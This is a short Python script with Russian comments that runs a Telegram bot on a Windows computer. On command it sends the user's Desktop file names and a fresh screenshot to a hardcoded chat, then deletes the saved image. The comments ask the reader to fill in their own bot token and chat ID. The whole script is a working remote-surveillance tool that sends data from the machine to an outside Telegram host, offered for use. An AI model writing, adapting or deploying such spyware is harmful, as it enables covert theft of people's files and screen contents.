from os import listdir, close, remove
from getpass import getuser
from telebot import TeleBot
from pyautogui import screenshot

bot = TeleBot('Токен вашего бота')
directory = listdir(f'C://Users/{getuser()}/Desktop')


@bot.message_handler(commands=['desktop'])
def desktop(message):
    for data in directory:
        bot.send_message(1902012012  # Это рандомный набор цифр(тут вы должны указать ID вашего с ботом чата.Как его узнать ,вы сможете найти в файле Как узнать ID.txt)
, data)


@bot.message_handler(commands=['screenshot'])
def get_screen(message):
    photo = screenshot('screen.jpg')
    bot.send_photo(1902012012 # Тут тоже ID чата
, photo)
    remove('screen.jpg')


bot.polling(True)
